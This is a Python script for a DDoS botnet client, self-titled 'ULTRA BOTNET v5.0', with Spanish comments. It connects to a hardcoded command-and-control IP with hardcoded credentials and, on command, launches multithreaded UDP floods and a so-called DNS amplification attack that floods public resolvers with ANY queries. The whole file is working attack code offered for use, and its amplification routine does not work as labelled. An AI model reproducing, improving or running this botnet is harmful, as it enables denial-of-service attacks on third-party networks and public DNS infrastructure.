import socket
import time
import random
import threading
import select
import sys

# CONFIG
CNC_IP = "172.96.140.62"
CNC_PORT = 14038
USER = "rockyy"
PASS = "rockyy123"

class UltraBot:
    def __init__(self):
        self.running = True
        self.attack_active = False
        self.current_method = None
        self.lock = threading.Lock()
        self.attack_threads = []
        
    def stop_all(self):
        """Detener todos los ataques completamente"""
        with self.lock:
            self.attack_active = False
            
        # Esperar que todos los threads terminen
        for t in self.attack_threads:
            if t.is_alive():
                t.join(timeout=0.5)
        
        self.attack_threads.clear()
        print("[!] Todos los ataques detenidos completamente")
        
    def udp_nuke(self, target, port, duration):
        """UDP Flood - DURACIÓN COMPLETA GARANTIZADA"""
        print(f"[⚡] UDP NUKE: {target}:{port} {duration}s")
        self.stop_all()
        
        with self.lock:
            self.attack_active = True
            self.current_method = "UDP_NUKE"
            
        end_time = time.time() + int(duration)
        packet_size = 1400
        total_packets = 0
        start_time = time.time()
        
        # Crear sockets persistentes
        sockets = []
        for i in range(100):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1024*1024)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                sock.setblocking(False)
                sockets.append(sock)
            except:
                continue
        
        if not sockets:
            print("[!] No se pudieron crear sockets")
            return
            
        print(f"[+] {len(sockets)} sockets creados")
        
        # Payloads pre-generados
        payloads = [random._urandom(packet_size) for _ in range(20)]
        
        def worker(worker_id):
            nonlocal total_packets
            local_count = 0
            sock = sockets[worker_id % len(sockets)]
            
            while time.time() < end_time and self.attack_active:
                try:
                    # Enviar ráfaga continua
                    for _ in range(500):
                        payload = payloads[local_count % 20]
                        try:
                            sock.sendto(payload, (target, int(port)))
                            local_count += 1
                        except BlockingIOError:
                            continue
                        except:
                            break
                    
                    # Actualizar contador global
                    if local_count >= 1000:
                        with self.lock:
                            total_packets += local_count
                        local_count = 0
                        
                except Exception as e:
                    continue
            
            # Contador final
            with self.lock:
                total_packets += local_count
        
        # Iniciar workers
        threads = []
        for i in range(min(80, len(sockets))):
            t = threading.Thread(target=worker, args=(i,))
            t.daemon = True
            t.start()
            threads.append(t)
        
        print(f"[+] {len(threads)} workers iniciados")
        
        # MONITOR PRINCIPAL - GARANTIZA DURACIÓN EXACTA
        print(f"[⚡] INICIANDO UDP NUKE POR {duration}s")
        
        last_report = time.time()
        while time.time() < end_time and self.attack_active:
            current_time = time.time()
            remaining = end_time - current_time
            
            # Si falta poco tiempo, esperar exacto
            if remaining <= 1:
                time.sleep(remaining)
                break
                
            # Reporte cada 3 segundos
            if current_time - last_report > 3:
                with self.lock:
                    current_total = total_packets
                
                elapsed = current_time - start_time
                if elapsed > 0:
                    current_mb = (current_total * packet_size) / 1_000_000
                    current_mbps = (current_mb * 8) / elapsed
                    print(f"[⚡] NUKE activo - {remaining:.1f}s | Paquetes: {current_total:,} | {current_mbps:.1f} Mbps")
                
                last_report = current_time
            
            time.sleep(0.1)
        
        # GARANTIZAR TIEMPO COMPLETO (última verificación)
        if time.time() < end_time:
            sleep_time = end_time - time.time()
            if sleep_time > 0:
                print(f"[⚡] Asegurando tiempo restante: {sleep_time:.2f}s")
                time.sleep(sleep_time)
        
        # ESTADÍSTICAS FINALES
        elapsed = max(0.1, time.time() - start_time)
        with self.lock:
            final_packets = total_packets
            
        total_mb = (final_packets * packet_size) / 1_000_000
        total_gb = total_mb / 1024
        avg_mbps = (total_mb * 8) / elapsed
        
        print(f"\n{'='*50}")
        print(f"[✓] UDP NUKE COMPLETADO - {elapsed:.1f}s DE ATAQUE")
        print(f"{'='*50}")
        print(f"    Paquetes enviados: {final_packets:,}")
        print(f"    Tamaño por paquete: {packet_size:,} bytes")
        print(f"    Datos totales: {total_mb:.2f} MB ({total_gb:.2f} GB)")
        print(f"    Ancho de banda promedio: {avg_mbps:.2f} Mbps")
        print(f"    Tiempo exacto: {elapsed:.2f} segundos")
        print(f"{'='*50}")
        
        # Limpiar
        for sock in sockets:
            try:
                sock.close()
            except:
                pass
                
        with self.lock:
            self.attack_active = False
    
    def udp_generic(self, target, port, duration):
        """UDP Generic - NO SE CORTARÁ - VERSIÓN MEJORADA"""
        print(f"[🌀] UDP GENERIC: {target}:{port} {duration}s")
        self.stop_all()
        
        with self.lock:
            self.attack_active = True
            self.current_method = "UDP_GENERIC"
            
        end_time = time.time() + int(duration)
        packet_size = 65000  # TAMAÑO MÁXIMO
        total_packets = 0
        start_time = time.time()
        packets_lock = threading.Lock()
        
        # Payloads pre-generados (diferentes patrones)
        payloads = [
            b'\xff' * packet_size,
            b'\x00' * packet_size,
            b'\x55' * packet_size,
            b'\xaa' * packet_size,
            random._urandom(packet_size),
            b'X' * packet_size,
            b'\x01\x02\x03' * (packet_size // 3),
        ]
        
        def worker(worker_id):
            nonlocal total_packets
            local_count = 0
            
            # Crear socket propio para cada worker
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1024*1024)
                sock.setsockopt(socket.SOCKET, socket.SO_REUSEADDR, 1)
                sock.setblocking(False)  # No bloquear
            except:
                return
            
            while time.time() < end_time and self.attack_active:
                try:
                    # Enviar en ráfagas grandes y continuas
                    for _ in range(50):  # 50 paquetes gigantes por ráfaga
                        payload = payloads[local_count % len(payloads)]
                        try:
                            sock.sendto(payload, (target, int(port)))
                            local_count += 1
                        except BlockingIOError:
                            # Buffer lleno, continuar igual
                            time.sleep(0.001)
                            continue
                        except Exception as e:
                            # Si hay error, recrear socket
                            try:
                                sock.close()
                                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                                sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1024*1024)
                                sock.setblocking(False)
                            except:
                                break
                    
                    # Actualizar contador global periódicamente
                    if local_count >= 100:
                        with packets_lock:
                            total_packets += local_count
                        local_count = 0
                        
                except Exception as e:
                    continue
            
            # Finalizar - enviar contador restante
            with packets_lock:
                total_packets += local_count
            
            # Cerrar socket
            try:
                sock.close()
            except:
                pass
        
        # MONITOR DE DURACIÓN (Thread separado)
        def duration_monitor():
            print(f"[🌀] MONITOR: Iniciando ataque de {duration} segundos")
            
            # Verificar continuamente el tiempo restante
            while time.time() < end_time and self.attack_active:
                current_time = time.time()
                remaining = end_time - current_time
                
                # Si queda menos de 1 segundo, esperar exacto
                if remaining <= 1:
                    time.sleep(remaining)
                    break
                    
                # Sleep corto pero efectivo
                time.sleep(0.5)
            
            # Última verificación para garantizar tiempo completo
            if time.time() < end_time:
                sleep_time = end_time - time.time()
                if sleep_time > 0:
                    print(f"[🌀] MONITOR: Asegurando últimos {sleep_time:.3f}s")
                    time.sleep(sleep_time)
            
            print("[🌀] MONITOR: Tiempo completado al 100%")
        
        # Iniciar workers (MÁS WORKERS para mayor potencia)
        threads = []
        for i in range(150):  # Aumentado a 150 workers
            t = threading.Thread(target=worker, args=(i,))
            t.daemon = True
            t.start()
            threads.append(t)
        
        # Iniciar monitor de duración
        monitor_thread = threading.Thread(target=duration_monitor)
        monitor_thread.daemon = True
        monitor_thread.start()
        
        print(f"[+] {len(threads)} workers Generic iniciados")
        print(f"[🌀] INICIANDO ATAQUE UDP GENERIC POR {duration}s")
        
        # MONITOR PRINCIPAL - SOLO REPORTES
        last_report = time.time()
        while time.time() < end_time and self.attack_active:
            current_time = time.time()
            remaining = end_time - current_time
            
            # Reporte cada 2 segundos
            if current_time - last_report > 2:
                with packets_lock:
                    current_total = total_packets
                
                elapsed = current_time - start_time
                if elapsed > 0:
                    current_mb = (current_total * packet_size) / 1_000_000
                    current_mbps = (current_mb * 8) / elapsed
                    print(f"[🌀] Generic activo - {remaining:.1f}s | Paquetes: {current_total:,} | {current_mbps:.1f} Mbps")
                
                last_report = current_time
            
            time.sleep(0.5)
        
        # ESPERAR A QUE TERMINE EL MONITOR
        monitor_thread.join(timeout=2)
        
        # ESPERAR A QUE TODOS LOS WORKERS TERMINEN
        for t in threads:
            t.join(timeout=1)
        
        # ESTADÍSTICAS FINALES EXACTAS
        elapsed = max(0.1, time.time() - start_time)
        with packets_lock:
            final_packets = total_packets
            
        total_mb = (final_packets * packet_size) / 1_000_000
        total_gb = total_mb / 1024
        avg_mbps = (total_mb * 8) / elapsed
        
        print(f"\n{'='*60}")
        print(f"[✓] UDP GENERIC COMPLETADO AL 100% - {elapsed:.2f}s DE ATAQUE")
        print(f"{'='*60}")
        print(f"    Paquetes enviados: {final_packets:,}")
        print(f"    Tamaño por paquete: {packet_size:,} bytes (MÁXIMO)")
        print(f"    Datos totales: {total_mb:.2f} MB ({total_gb:.3f} GB)")
        print(f"    Ancho de banda promedio: {avg_mbps:.2f} Mbps")
        print(f"    Tiempo exacto: {elapsed:.2f} segundos")
        print(f"    Eficiencia: {((avg_mbps / 1000) * 100):.1f}% de 1Gbps")
        print(f"{'='*60}")
        
        with self.lock:
            self.attack_active = False
    
    def dns_magnifier(self, target, port, duration):
        """DNS Amplification - DURACIÓN COMPLETA GARANTIZADA"""
        print(f"[🌪️] DNS MAGNIFIER: {target}:{port} {duration}s")
        self.stop_all()
        
        with self.lock:
            self.attack_active = True
            self.current_method = "DNS_MAGNIFIER"
            
        end_time = time.time() + int(duration)
        total_queries = 0
        start_time = time.time()
        queries_lock = threading.Lock()
        
        # DNS servers públicos
        dns_servers = [
            "8.8.8.8", "8.8.4.4", "1.1.1.1", "1.0.0.1",
            "9.9.9.9", "149.112.112.112",
            "208.67.222.222", "208.67.220.220",
            "64.6.64.6", "64.6.65.6",
        ]
        
        # DNS queries (consultas amplificadoras)
        queries = [
            bytes.fromhex("00000100000100000000000006676f6f676c6503636f6d0000ff0001"),
            bytes.fromhex("00000100000100000000000006676f6f676c6503636f6d0000100001"),
            bytes.fromhex("00000100000100000000000007796f757475626503636f6d0000ff0001"),
            bytes.fromhex("0000010000010000000000000666616365626f6f6b03636f6d0000ff0001"),
        ]
        
        def dns_worker(worker_id):
            nonlocal total_queries
            local_count = 0
            
            while time.time() < end_time and self.attack_active:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    sock.settimeout(0.5)  # Timeout corto
                    
                    # Enviar ráfaga de consultas
                    for _ in range(25):
                        server = random.choice(dns_servers)
                        query = random.choice(queries)
                        try:
                            sock.sendto(query, (server, 53))
                            local_count += 1
                        except:
                            break
                    
                    sock.close()
                    
                    # Actualizar contador global
                    if local_count >= 100:
                        with queries_lock:
                            total_queries += local_count
                        local_count = 0
                        
                except:
                    continue
            
            # Finalizar
            with queries_lock:
                total_queries += local_count
        
        # MONITOR DE DURACIÓN
        def dns_duration_monitor():
            while time.time() < end_time and self.attack_active:
                remaining = end_time - time.time()
                if remaining <= 1:
                    time.sleep(remaining)
                    break
                time.sleep(0.5)
        
        # Iniciar workers DNS
        threads = []
        for i in range(250):  # Más workers para DNS
            t = threading.Thread(target=dns_worker, args=(i,))
            t.daemon = True
            t.start()
            threads.append(t)
        
        # Iniciar monitor
        monitor_thread = threading.Thread(target=dns_duration_monitor)
        monitor_thread.daemon = True
        monitor_thread.start()
        
        # Reportes
        last_report = time.time()
        while time.time() < end_time and self.attack_active:
            time.sleep(0.5)
            
            if time.time() - last_report > 3:
                remaining = end_time - time.time()
                with queries_lock:
                    current_total = total_queries
                
                elapsed = time.time() - start_time
                estimated_mb = (current_total * 4000) / 1_000_000
                estimated_mbps = (estimated_mb * 8) / elapsed if elapsed > 0 else 0
                
                print(f"[🌪️] DNS activo - {remaining:.1f}s | Consultas: {current_total:,} | ~{estimated_mbps:.1f} Mbps")
                last_report = time.time()
        
        # Esperar threads
        monitor_thread.join(timeout=1)
        
        # Estadísticas finales
        elapsed = max(0.1, time.time() - start_time)
        with queries_lock:
            final_queries = total_queries
            
        estimated_mb = (final_queries * 4000) / 1_000_000
        estimated_gb = estimated_mb / 1024
        estimated_mbps = (estimated_mb * 8) / elapsed
        
        print(f"\n{'='*50}")
        print(f"[✓] DNS MAGNIFIER COMPLETADO - {elapsed:.1f}s")
        print(f"{'='*50}")
        print(f"    Consultas DNS: {final_queries:,}")
        print(f"    Tráfico estimado: {estimated_mb:.2f} MB ({estimated_gb:.2f} GB)")
        print(f"    Poder estimado: {estimated_mbps:.2f} Mbps")
        print(f"{'='*50}")
        
        with self.lock:
            self.attack_active = False
    
    def handle_command(self, cmd):
        """Manejar comandos del CNC"""
        try:
            parts = cmd.split()
            if len(parts) < 4:
                return
                
            method = parts[0]
            target = parts[1]
            port = parts[2]
            duration = parts[3]
            
            print(f"[>] Comando recibido: {method} {target}:{port} {duration}s")
            
            if method == ".udp":
                t = threading.Thread(target=self.udp_nuke, args=(target, port, duration), daemon=True)
                self.attack_threads.append(t)
                t.start()
            elif method == ".dns":
                t = threading.Thread(target=self.dns_magnifier, args=(target, port, duration), daemon=True)
                self.attack_threads.append(t)
                t.start()
            elif method == ".udp-generic":
                t = threading.Thread(target=self.udp_generic, args=(target, port, duration), daemon=True)
                self.attack_threads.append(t)
                t.start()
            elif method == ".stop":
                self.stop_all()
            else:
                print(f"[!] Método desconocido: {method}")
                
        except Exception as e:
            print(f"[!] Error en comando: {e}")

def main():
    bot = UltraBot()
    
    print("""
    ╔══════════════════════════════════════════╗
    ║     ULTRA BOTNET v5.0 - NO CUT PRO       ║
    ║    =================================     ║
    ║    Métodos disponibles:                  ║
    ║    [.udp]         - UDP Nuke (1400B)    ║
    ║    [.dns]         - DNS Amplify         ║
    ║    [.udp-generic] - UDP 65KB (MÁXIMO)   ║
    ║    [.stop]        - Detener todo        ║
    ║    =================================     ║
    ║    GARANTIZADO: DURACIÓN 100% COMPLETA  ║
    ║    NO SE CORTARÁ HASTA FINALIZAR        ║
    ╚══════════════════════════════════════════╝
    """)
    
    reconnect_delay = 3
    
    while True:
        try:
            print(f"[+] Conectando al CNC {CNC_IP}:{CNC_PORT}...")
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(30)
            sock.connect((CNC_IP, CNC_PORT))
            
            # Autenticar
            auth_msg = f"BOT|{USER}|{PASS}\n"
            sock.send(auth_msg.encode())
            
            response = sock.recv(1024).decode().strip()
            if not response.startswith("OK|"):
                print(f"[!] Error de autenticación: {response}")
                sock.close()
                time.sleep(reconnect_delay)
                continue
                
            bot_id = response.split("|")[1]
            print(f"[✓] Autenticado como BOT #{bot_id}")
            print("[+] Esperando comandos...")
            
            reconnect_delay = 3  # Reset delay
            
            # Loop principal de comandos
            while True:
                try:
                    ready = select.select([sock], [], [], 5)
                    
                    if ready[0]:
                        data = sock.recv(4096).decode().strip()
                        
                        if not data:
                            print("[!] Conexión cerrada por el servidor")
                            break
                            
                        # Procesar múltiples comandos
                        lines = data.split('\n')
                        for line in lines:
                            line = line.strip()
                            if not line:
                                continue
                                
                            if line == "PING":
                                sock.send(b"PONG\n")
                            elif line.startswith("."):
                                bot.handle_command(line)
                            else:
                                print(f"[?] Datos recibidos: {line}")
                    
                    # Verificar conexión periódicamente
                    try:
                        sock.send(b"STATUS\n")
                    except:
                        break
                    
                except socket.timeout:
                    continue
                except ConnectionResetError:
                    print("[!] Conexión reseteada por el servidor")
                    break
                except BrokenPipeError:
                    print("[!] Pipe roto, reconectando...")
                    break
                except Exception as e:
                    print(f"[!] Error en loop: {e}")
                    break
            
            sock.close()
            
        except ConnectionRefusedError:
            print(f"[!] CNC no disponible, reconectando en {reconnect_delay}s...")
        except socket.timeout:
            print(f"[!] Timeout de conexión, reconectando en {reconnect_delay}s...")
        except Exception as e:
            print(f"[!] Error crítico: {e}")
        
        # Esperar antes de reconectar
        time.sleep(reconnect_delay)
        reconnect_delay = min(reconnect_delay * 1.5, 30)  # Backoff exponencial más corto
        
        # Detener cualquier ataque en curso
        bot.stop_all()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Botnet detenido por usuario")
        sys.exit(0)
    except Exception as e:
        print(f"[!] Error fatal: {e}")
        sys.exit(1)
